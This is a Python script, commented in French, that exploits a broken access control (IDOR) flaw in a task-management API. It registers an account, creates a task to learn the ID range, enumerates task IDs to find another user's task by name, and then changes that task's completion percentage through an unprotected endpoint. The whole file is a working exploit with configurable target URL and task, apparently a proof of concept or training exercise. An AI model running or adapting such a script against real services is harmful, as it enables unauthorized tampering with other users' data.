import requests
import argparse

# Configuration via arguments en ligne de commande
parser = argparse.ArgumentParser(description="Exploit de contrôle d'accès")
parser.add_argument("--url", required=True, help="URL de base de l'API (ex: http://localhost:8080/api)")
parser.add_argument("--target-task", required=True, help="Nom de la tâche cible à modifier")
parser.add_argument("--percentage", type=int, default=70, help="Nouveau pourcentage (défaut: 70)")
args = parser.parse_args()

# Configuration dynamique
BASE_URL = args.url
TARGET_TASK_NAME = args.target_task
NEW_PERCENTAGE = args.percentage
USERNAME = "Bobo"
PASSWORD = "password"

session = requests.Session()

def signup():
    """Authentification"""
    url = f"{BASE_URL}/id/signup"
    data = {"username": USERNAME, "password": PASSWORD}
    headers = {"Content-Type": "application/json"}
    try:
        response = session.post(url, json=data, headers=headers)
        response.raise_for_status()
        print(f"[+] Authentification réussie. Cookies : {session.cookies.get_dict()}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de l'authentification : {e.response.text if e.response else e}")
        exit(1)

def create_task():
    """Création d'une tâche de test"""
    url = f"{BASE_URL}/add"
    data = {"name": "Ma tâche", "deadline": "2069-05-24T12:12:12"}
    try:
        response = session.post(url, json=data)
        response.raise_for_status()
        print("[+] Tâche de test créée avec succès.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la création de tâche : {e}")
        exit(1)

def get_my_task_id():
    """Récupère l'ID de la tâche créée"""
    url = f"{BASE_URL}/home"
    try:
        response = session.get(url)
        response.raise_for_status()
        tasks = response.json()
        
        for task in tasks:
            if task.get("name") == "Ma tâche":
                task_id = task.get("id")
                print(f"[+] ID de la tâche de test : {task_id}")
                return task_id
        
        print("[-] Aucune tâche de test trouvée.")
        return None
    except (requests.exceptions.RequestException, KeyError) as e:
        print(f"[-] Échec de récupération de l'ID : {e}")
        exit(1)

def find_target_task_id(max_id):
    """Recherche la tâche cible"""
    for id in range(0, max_id + 1):
        url = f"{BASE_URL}/detail/{id}"
        try:
            response = session.get(url)
            if response.status_code == 200:
                task = response.json()
                if task.get("name") == TARGET_TASK_NAME:
                    print(f"[+] Tâche cible trouvée : ID = {id}")
                    return id
        except requests.exceptions.RequestException as e:
            print(f"[-] Erreur lors de la vérification de l'ID {id} : {e}")
    print("[-] Tâche cible non trouvée.")
    return None

def modify_task_progress(task_id):
    """Modifie le pourcentage de la tâche"""
    url = f"{BASE_URL}/progress/{task_id}/{NEW_PERCENTAGE}"
    try:
        response = session.get(url)
        response.raise_for_status()
        print(f"[+] Pourcentage modifié à {NEW_PERCENTAGE}%.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la modification : {e}")
        exit(1)

def verify_attack(task_id):
    """Vérifie la modification"""
    url = f"{BASE_URL}/detail/{task_id}"
    try:
        response = session.get(url)
        task = response.json()
        current_percentage = task.get("percentageDone")
        print(f"[Vérification] Pourcentage actuel : {current_percentage}%")
        return current_percentage == NEW_PERCENTAGE
    except requests.exceptions.RequestException as e:
        print(f"[-] Échec de la vérification : {e}")
        return False

if __name__ == "__main__":
    print(f"\n=== Lancement de l'exploit ===")
    print(f"Cible : {TARGET_TASK_NAME} sur {BASE_URL}")
    print(f"Nouveau pourcentage souhaité : {NEW_PERCENTAGE}%\n")
    
    signup()
    create_task()
    my_task_id = get_my_task_id()
    target_id = find_target_task_id(my_task_id)
    
    if target_id is not None:
        modify_task_progress(target_id)
        success = verify_attack(target_id)
        
        if success:
            print("\n[✔] SUCCÈS : L'attaque a parfaitement fonctionné !")
            print(f"La tâche '{TARGET_TASK_NAME}' (ID: {target_id}) a été modifiée à {NEW_PERCENTAGE}%")
        else:
            print("\n[✖] ÉCHEC : La modification n'a pas été vérifiée")
    else:
        print("\n[✖] ÉCHEC : Tâche cible introuvable")